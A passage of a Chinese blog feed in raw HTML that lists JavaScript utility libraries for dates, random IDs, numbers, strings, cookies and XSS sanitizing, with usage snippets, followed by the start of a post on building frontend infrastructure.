data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663346140487-27c42d73-9e35-48cd-b719-d4a34fa469fd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="B51Yr"></a></p><h1 id="2-日期"><a href="#2-日期" class="headerlink" title="2. 日期"></a>2. 日期</h1><p><a name="A8cPr"></a></p><h2 id="（1）date-fns"><a href="#（1）date-fns" class="headerlink" title="（1）date-fns"></a>（1）date-fns</h2><p>date-fns 是一个现代的 JavaScript 日期工具类库，提供了最全面、最简单和一致的工具集，用于在浏览器和 Node.js 中操作 JavaScript 日期。其具有以下特性：<br />●<strong>模块化</strong>：根据需求选择需要引用的模块<br />●<strong>不可变</strong>：date-fns 使用纯函数构建，并且始终返回一个新的日期实例，而不是更改传递的日期实例。它允许防止错误并跳过长时间的调试会话<br />●<strong>可信赖</strong>：遵循语义版本，始终向后兼容<br />●<strong>快速</strong>：轻量快速，为用户提供最佳的使用体验<br />●<strong>TypeScript &amp; Flow</strong>：date-fns 同时支持 Flow 和 TypeScript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; format, formatDistance, formatRelative, subDays &#125; <span class="keyword">from</span> <span class="string">&#x27;date-fns&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">format</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="string">&quot;&#x27;Today is a&#x27; eeee&quot;</span>)</span><br><span class="line"><span class="comment">//=&gt; &quot;Today is a Saturday&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">formatDistance</span>(<span class="title function_">subDays</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="number">3</span>), <span class="keyword">new</span> <span class="title class_">Date</span>(), &#123; <span class="attr">addSuffix</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"><span class="comment">//=&gt; &quot;3 days ago&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">formatRelative</span>(<span class="title function_">subDays</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), <span class="number">3</span>), <span class="keyword">new</span> <span class="title class_">Date</span>())</span><br><span class="line"><span class="comment">//=&gt; &quot;last Friday at 7:26 p.m.&quot;</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/date-fns/date-fns">https://github.com/date-fns/date-fns</a></p><p><a name="JoInD"></a></p><h2 id="（2）Moment-js"><a href="#（2）Moment-js" class="headerlink" title="（2）Moment.js"></a>（2）Moment.js</h2><p>Moment.js 是一个简单易用的轻量级 JavaScript 日期处理类库，提供了日期格式化、解析、验证等功能。它支持在浏览器和 NodeJS 两种环境中运行。此类库能够将给定的任意日期转换成多种不同的格式，具有强大的日期计算功能，同时也内置了能显示多样的日期形式的函数。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663345546273-1a6234fd-3648-4512-8e43-be63227a78a0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663345546273-1a6234fd-3648-4512-8e43-be63227a78a0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="e8bFT"></a></p><h2 id="（3）Day-js"><a href="#（3）Day-js" class="headerlink" title="（3）Day.js"></a>（3）Day.js</h2><p>Day.js 是一个极简的 JavaScript 库，可以为现代浏览器解析、验证、操作和显示日期和时间。其具有以下特点：<br />● 和 Moment.js 相同的 API 和用法<br />● 不可变数据 (Immutable)<br />● 支持链式操作 (Chainable)<br />● 国际化 I18n<br />● 仅 2kb 大小的微型库<br />● 全浏览器兼容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">dayjs</span>().<span class="title function_">format</span>();                                     <span class="comment">// 2020-09-08T13:42:32+08:00</span></span><br><span class="line"><span class="title function_">dayjs</span>().<span class="title function_">format</span>(<span class="string">&#x27;YYYY-MM-DD&#x27;</span>);                         <span class="comment">// 2020-09-08</span></span><br><span class="line"><span class="title function_">dayjs</span>().<span class="title function_">format</span>(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>);                <span class="comment">// 2020-09-08 13:47:12</span></span><br><span class="line"><span class="title function_">dayjs</span>(<span class="number">1318781876406</span>).<span class="title function_">format</span>(<span class="string">&#x27;YYYY-MM-DD HH:mm:ss&#x27;</span>);   <span class="comment">// 2011-10-17 00</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/iamkun/dayjs/">https://github.com/iamkun/dayjs/</a></p><p><a name="bCsN7"></a></p><h1 id="3-随机值"><a href="#3-随机值" class="headerlink" title="3. 随机值"></a>3. 随机值</h1><p><a name="jnxxN"></a></p><h2 id="（1）Chance-js"><a href="#（1）Chance-js" class="headerlink" title="（1）Chance.js"></a>（1）Chance.js</h2><p>Chance 是一个轻量级的 JavaScript 随机字符串生成器插件，可帮助减少编写单调的代码，特别是在编写自动化测试时经常需要各种随机内容。可以使用它来产生随机数、字符、字符串、名字、地址、骰子等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663346553258-2cab16aa-ec04-4108-8dae-68ad28cdf65e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663346553258-2cab16aa-ec04-4108-8dae-68ad28cdf65e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="zJE0S"></a></p><h2 id="（2）UUID"><a href="#（2）UUID" class="headerlink" title="（2）UUID"></a>（2）UUID</h2><p>UUID 是一个用于在 JavaScript 中生成符合 RFC 的 UUID 的实用程序库。其具有以下特点：<br />●<strong>完整</strong>：支持 RFC4122 版本 1、3、4 和 5 UUID<br />●<strong>跨平台</strong>：支持 CommonJS、ECMAScript 模块和 CDN 构建；Node 12, 14, 16, 18；Chrome、Safari、Firefox、Edge 浏览器；Webpack 和 rollup.js 模块打包工具；<br />●<strong>安全</strong>：加密强度高的随机值<br />●<strong>体积小</strong>：零依赖，占用空间小<br />●<strong>CLI</strong>：包括 uuid 命令行实用程序<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663346948580-38577de8-3075-45fc-9c3f-c317ed9c25e0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663346948580-38577de8-3075-45fc-9c3f-c317ed9c25e0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="TdjzQ"></a></p><h2 id="（3）Nano-ID"><a href="#（3）Nano-ID" class="headerlink" title="（3）Nano ID"></a>（3）Nano ID</h2><p>nanoid 是一个小巧、安全、URL 友好、唯一的 JavaScript 字符串 ID 生成器。其具有以下特性：<br />●<strong>小巧.<strong>130 bytes (已压缩和 gzipped)。 没有依赖。Size Limit 控制大小。<br />●</strong>快速.<strong>它比 UUID 快 60%。<br />●</strong>安全.<strong>它使用加密的强随机 API。可在集群中使用。<br />●</strong>紧凑.<strong>它使用比 UUID（A-Za-z0-9_-）更大的字母表。 因此，ID 大小从 36 个符号减少到 21 个符号。<br />●</strong>易用.</strong> Nano ID 已被移植到 20 种编程语言。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; nanoid &#125; <span class="keyword">from</span> <span class="string">&#x27;nanoid&#x27;</span></span><br><span class="line">model.<span class="property">id</span> = <span class="title function_">nanoid</span>() <span class="comment">//=&gt; &quot;V1StGXR8_Z5jdHi6B-myT&quot;</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/ai/nanoid">https://github.com/ai/nanoid</a></p><p><a name="OICzz"></a></p><h1 id="4-数字"><a href="#4-数字" class="headerlink" title="4. 数字"></a>4. 数字</h1><p><a name="CJBLT"></a></p><h2 id="（1）Math-js"><a href="#（1）Math-js" class="headerlink" title="（1）Math.js"></a>（1）Math.js</h2><p>Math.js 是一个强大的 JavaScript 和 Node.js 数学库。它具有支持符号计算的灵活表达式解析器，带有大量内置函数和常量，并提供了一个集成的解决方案来处理不同的数据类型，如数字、大数、复数、分数、单位和矩阵。功能强大且易于使用。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663345429885-0e72b914-e929-4b6c-abad-06635795590c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663345429885-0e72b914-e929-4b6c-abad-06635795590c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="eeHP5"></a></p><h2 id="（2）Numeral-js"><a href="#（2）Numeral-js" class="headerlink" title="（2）Numeral.js"></a>（2）Numeral.js</h2><p>Numeral.js 是一个用来对数值进行操作和格式化的 JS 库。可将数字格式化为货币、百分比、时间，甚至是序数词的缩写（比如 1st，100th）。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663395404093-ae3d768c-0ccd-4ed3-89d9-0087808855cf.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663395404093-ae3d768c-0ccd-4ed3-89d9-0087808855cf.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="VIbiK"></a></p><h2 id="（3）Accounting-js"><a href="#（3）Accounting-js" class="headerlink" title="（3）Accounting.js"></a>（3）Accounting.js</h2><p>Accounting.js 是一个用于数字、货币和货币解析&#x2F;格式化的小型 JavaScript 库。它是轻量级的，完全可本地化的，没有依赖关系，并且在客户端或服务器端都可以很好地工作。使用独立或作为 nodeJS&#x2F;npm 和 AMD&#x2F;requireJS 模块。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Default usage:</span></span><br><span class="line">accounting.<span class="title function_">formatMoney</span>(<span class="number">12345678</span>); <span class="comment">// $12,345,678.00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// European formatting (custom symbol and separators), can also use options object as second parameter:</span></span><br><span class="line">accounting.<span class="title function_">formatMoney</span>(<span class="number">4999.99</span>, <span class="string">&quot;€&quot;</span>, <span class="number">2</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;,&quot;</span>); <span class="comment">// €4.999,99</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Negative values can be formatted nicely:</span></span><br><span class="line">accounting.<span class="title function_">formatMoney</span>(-<span class="number">500000</span>, <span class="string">&quot;£ &quot;</span>, <span class="number">0</span>); <span class="comment">// £ -500,000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple `format` string allows control of symbol position (%v = value, %s = symbol):</span></span><br><span class="line">accounting.<span class="title function_">formatMoney</span>(<span class="number">5318008</span>, &#123; <span class="attr">symbol</span>: <span class="string">&quot;GBP&quot;</span>,  <span class="attr">format</span>: <span class="string">&quot;%v %s&quot;</span> &#125;); <span class="comment">// 5,318,008.00 GBP</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/openexchangerates/accounting.js">https://github.com/openexchangerates/accounting.js</a></p><p><a name="meSLV"></a></p><h1 id="5-字符串"><a href="#5-字符串" class="headerlink" title="5. 字符串"></a>5. 字符串</h1><p><a name="oCUVb"></a></p><h2 id="（1）qs"><a href="#（1）qs" class="headerlink" title="（1）qs"></a>（1）qs</h2><p>qs 是一个 url 参数转化（parse 和 stringify）的 JavaScript 库。可以把格式化的字符串转换为对象格式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> qs = <span class="built_in">require</span>(<span class="string">&#x27;qs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> assert = <span class="built_in">require</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = qs.<span class="title function_">parse</span>(<span class="string">&#x27;a=c&#x27;</span>);</span><br><span class="line">assert.<span class="title function_">deepEqual</span>(obj, &#123; <span class="attr">a</span>: <span class="string">&#x27;c&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = qs.<span class="title function_">stringify</span>(obj);</span><br><span class="line">assert.<span class="title function_">equal</span>(str, <span class="string">&#x27;a=c&#x27;</span>);</span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/ljharb/qs">https://github.com/ljharb/qs</a></p><p><a name="O8Q54"></a></p><h2 id="（2）Voca"><a href="#（2）Voca" class="headerlink" title="（2）Voca"></a>（2）Voca</h2><p>Voca 是一个用于操作字符串的 JavaScript 库。Voca 库提供了有用的函数来使字符串操作更加舒适：更改大小写、修剪、填充、slugify、拉丁化、sprintfy、截断、转义等。模块化设计允许加载整个库或单个函数以最小化应用程序构建。该库经过全面测试、有据可查并长期受支持。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v.<span class="title function_">camelCase</span>(<span class="string">&#x27;bird flight&#x27;</span>);              <span class="comment">// =&gt; &#x27;birdFlight&#x27;</span></span><br><span class="line">v.<span class="title function_">sprintf</span>(<span class="string">&#x27;%s costs $%.2f&#x27;</span>, <span class="string">&#x27;Tea&#x27;</span>, <span class="number">1.5</span>); <span class="comment">// =&gt; &#x27;Tea costs $1.50&#x27;</span></span><br><span class="line">v.<span class="title function_">slugify</span>(<span class="string">&#x27;What a wonderful world&#x27;</span>);     <span class="comment">// =&gt; &#x27;what-a-wonderful-world&#x27;</span></span><br></pre></td></tr></table></figure><p><br /><strong>Github：</strong><a href="https://github.com/panzerdp/voca">https://github.com/panzerdp/voca</a></p><p><a name="Fa7TA"></a></p><h1 id="6-存储"><a href="#6-存储" class="headerlink" title="6. 存储"></a>6. 存储</h1><p><a name="GklnF"></a></p><h2 id="（1）js-cookie-js"><a href="#（1）js-cookie-js" class="headerlink" title="（1）js-cookie.js"></a>（1）js-cookie.js</h2><p>js-cookie.js 是一个用于处理浏览器 cookie 的简单、轻量级 JavaScript API。其具有以下特点：<br />● 适用于所有浏览器<br />● 接受任何字符<br />● 经过大量测试<br />● 无依赖<br />● 支持 ES 模块<br />● 支持 AMD&#x2F;CommonJS<br />● 符合 RFC 6265<br />● 有用的维基<br />● 启用自定义编码&#x2F;解码<br />●&lt; 800 字节压缩！<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663396381742-4045b423-ce34-4963-8cb3-ceedcfbf01de.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663396381742-4045b423-ce34-4963-8cb3-ceedcfbf01de.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="bW0B6"></a></p><h2 id="（2）Cookies"><a href="#（2）Cookies" class="headerlink" title="（2）Cookies"></a>（2）Cookies</h2><p>Cookies 是一个用于获取和设置 HTTP(S) cookie 的 node.js 模块。它的特点如下：<br />● 允许使用 Keygrip 来签署 cookie，以防止篡改；<br />● 延迟验证 cookie，以降低成本；<br />● 不允许通过不安全的套接字发送安全 cookies；<br />● 默认情况下，所有 cookie 都仅适用于 HTTP，并且通过 SSL 发送的 cookie 是安全的；<br />● 允许其他库在不知道签名机制的情况下访问 cookie。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Cookies</span> = <span class="built_in">require</span>(<span class="string">&#x27;cookies&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Optionally define keys to sign cookie values</span></span><br><span class="line"><span class="comment">// to prevent client tampering</span></span><br><span class="line"><span class="keyword">var</span> keys = [<span class="string">&#x27;keyboard cat&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = http.<span class="title function_">createServer</span>(<span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// Create a cookies object</span></span><br><span class="line">  <span class="keyword">var</span> cookies = <span class="keyword">new</span> <span class="title class_">Cookies</span>(req, res, &#123; <span class="attr">keys</span>: keys &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get a cookie</span></span><br><span class="line">  <span class="keyword">var</span> lastVisit = cookies.<span class="title function_">get</span>(<span class="string">&#x27;LastVisit&#x27;</span>, &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set the cookie to a value</span></span><br><span class="line">  cookies.<span class="title function_">set</span>(<span class="string">&#x27;LastVisit&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toISOString</span>(), &#123; <span class="attr">signed</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!lastVisit) &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Welcome, first time visitor!&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Welcome back! Nothing much changed since your last visit at &#x27;</span> + lastVisit + <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Visit us at http://127.0.0.1:3000/ !&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br /><strong>GitHub：</strong><a href="https://github.com/pillarjs/cookies">https://github.com/pillarjs/cookies</a></p><p><a name="gT8Pv"></a></p><h1 id="7-安全"><a href="#7-安全" class="headerlink" title="7. 安全"></a>7. 安全</h1><p><a name="I0YJt"></a></p><h2 id="（1）DOMPurify"><a href="#（1）DOMPurify" class="headerlink" title="（1）DOMPurify"></a>（1）DOMPurify</h2><p>DOMPurify 是一个开源的基于 DOM 的快速 XSS 净化工具。输入 HTML 元素，然后通过 DOM 解析递归元素节点，进行净化，输出安全的 HTML。 <br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663347229048-8ff9cd22-334b-4633-9cd3-fa9f3bd07c6d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1663347229048-8ff9cd22-334b-4633-9cd3-fa9f3bd07c6d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 数据处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何去搞前端基建</title>
      <link href="/2022/11/21/frontend/infrastructure/ru-he-qu-gao-qian-duan-ji-jian/"/>
      <url>/2022/11/21/frontend/infrastructure/ru-he-qu-gao-qian-duan-ji-jian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="FN5iV"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好，我是<a href="https://link.juejin.cn/?target=https://github.com/YWzzy">yinhan</a>，话说当下，前端职位在近十年的磨砺之下，已是百花齐放万家争鸣，前端也不再是以前那个单纯的切图仔；<br />要问为什么不单纯，无异于 前端工程化、前端 devops、前端跨端、前端工具化、前端 CI&#x2F;CD、前端 BFF、微前端 这些技术的出现，然而这些日新月异的技术聚合，咱们可以称其为 前端基建；<br />其实无论您是想成为 高级前端工程师，还是一名 合格的 Leader，都离不开对 <strong>前端技术与业务的基础建设沉淀</strong>；<br />看完全文，我相信 <strong>您的收获会远不止于此</strong> ~<br><a name="mD7nC"></a></p><h1 id="一、什么是基建？"><a href="#一、什么是基建？" class="headerlink" title="一、什么是基建？"></a>一、什么是基建？</h1><p>基建 这个词无论身处哪个行业，基本都会存在；只是在最近几年的软件计算机行业中尤为流行；<br />在建筑行业：一幢大厦所需的地基，脚手架，一块砖、一片瓦、一袋水泥、一扇窗等等咱都可以称之为基础建设的一部分；<br />在汽车行业：一辆汽车所需的车架子、发动机、车轱辘、方向盘、门窗等等咱也可称之为基础建设的一部分；<br />那么在互联网软件行业呢？<br />笔者的理解是：在软件行业，站在广义的角度上来讲基建包含了：业务基建、工程基建、前端基建、后端基建 等等；（此处仅笔者个人理解，如果意见不一样，以你的为准）<br><a name="VUwSL"></a></p><h2 id="业务基建？"><a href="#业务基建？" class="headerlink" title="业务基建？"></a>业务基建？</h2><p>业务基建 是指公司某个业务团队层面所维护的 前端基建、后端基建、基本规范文档、产品规则、设计规范、研发流程、测试边界、上线标准以及业务中台 等等的建设；<br />业务基建 服务于整个业务团队<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103192-d8ab0706-9dbe-409a-b3b6-e9fca379d5d5.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103192-d8ab0706-9dbe-409a-b3b6-e9fca379d5d5.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="vZHeV"></a></p><h2 id="工程基建？"><a href="#工程基建？" class="headerlink" title="工程基建？"></a>工程基建？</h2><p>工程基建 指的是业务团队内所有工程师的的一些 编码规范、api 规范、前后端协作、环境部署、微服务、微前端、性能、安全防御、统计监控、可视化 等等的建设；<br />工程基建 服务于整个工程团队；<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103192-d8ab0706-9dbe-409a-b3b6-e9fca379d5d5.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103192-d8ab0706-9dbe-409a-b3b6-e9fca379d5d5.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="工程基建"><br><a name="sUoPL"></a></p><h2 id="前端基建？"><a href="#前端基建？" class="headerlink" title="前端基建？"></a>前端基建？</h2><p>前端基建 指的是业务团队内的前端工程师执行的一些基础建设，包括了 前端规范文档、前端脚手架、前端模板、前端组件库、前端工具库、前端 BFF、前端 CI&#x2F;CD 的构建部署、前端数据埋点 等等；<br />前端基建 仅服务于前端团队；<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103292-69a329ee-2913-4281-90ea-8b19710ba834.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103292-69a329ee-2913-4281-90ea-8b19710ba834.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="RB8uY"></a></p><h2 id="后端基建？"><a href="#后端基建？" class="headerlink" title="后端基建？"></a>后端基建？</h2><p>后端基建 指的是业务团队内的后端工程师执行的一些基础建设，包括了 后端规范文档、后端模板、安全、日志、微服务、RESTful API、中间件、数据库、分布式、权限控制、服务器性能并发 等等；<br />注意：后端基建 仅服务于后端团队；<br><a name="YPeSd"></a></p><h2 id="关系图"><a href="#关系图" class="headerlink" title="关系图"></a>关系图</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103126-d59552e2-a23e-450f-ac97-8309c2839051.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103126-d59552e2-a23e-450f-ac97-8309c2839051.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br />看到这里，咱们已经明白了公司基建的一些基本分类和概括，下面我们也主要介绍下本文的主题前端基建；<br><a name="hEQFR"></a></p><h1 id="二、为什么要做前端基建？"><a href="#二、为什么要做前端基建？" class="headerlink" title="二、为什么要做前端基建？"></a>二、为什么要做前端基建？</h1><p><a name="amcFS"></a></p><h2 id="场景复现"><a href="#场景复现" class="headerlink" title="场景复现"></a>场景复现</h2><p><strong>场景一：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103136-94a241c3-415a-417b-9c96-b64f6e5abf32.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/300943/1675157103136-94a241c3-415a-417b-9c96-b64f6e5abf32.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="KX7VW"></a></p><h2 id="前端基建意义与作用"><a href="#前端基建意义与作用" class="headerlink" 